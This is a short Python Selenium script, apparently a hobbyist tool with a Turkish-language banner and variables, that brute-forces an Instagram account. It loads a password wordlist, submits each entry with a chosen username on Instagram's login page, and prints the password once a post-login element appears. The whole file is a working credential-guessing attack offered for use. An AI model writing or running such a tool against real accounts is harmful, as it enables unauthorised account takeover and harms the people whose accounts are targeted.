from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

ascii_art = '''
 __  __            _  __              _
|  \/  |_ __      | |/ /___ _ __ __ _| |
| |\/| | '__|     | ' // _ \ '__/ _` | |
| |  | | |     _  | . \  __/ | | (_| | |
|_|  |_|_|    (_) |_|\_\___|_|  \__,_|_|
'''
print(ascii_art) 

wordlist_name = input("Please enter your wordlist file's name : ")

wordlisttxt = open(f"{wordlist_name}.txt","r")

wordlist = wordlisttxt.readlines()

wordlisttxt.close()

adminusername = input("Please enter username : ")

key = None

i = 0

for sifre in wordlist:

    browser = webdriver.Chrome()

    browser.get("https://www.instagram.com/")

    browser.maximize_window()

    time.sleep(1)

    username = browser.find_element(By.XPATH,'//*[@id="loginForm"]/div/div[1]/div/label/input')
    username.send_keys(adminusername)

    password = browser.find_element(By.XPATH,'//*[@id="loginForm"]/div/div[2]/div/label/input')
    password.send_keys(sifre)
    password.send_keys(Keys.ENTER)

    time.sleep(6)

    try:

        button = browser.find_element(By.PARTIAL_LINK_TEXT,'Oluştur')

    except:

        browser.close()

        i += 1

        print(i)

        continue

    key = sifre

    break

print("Şifre :",key)
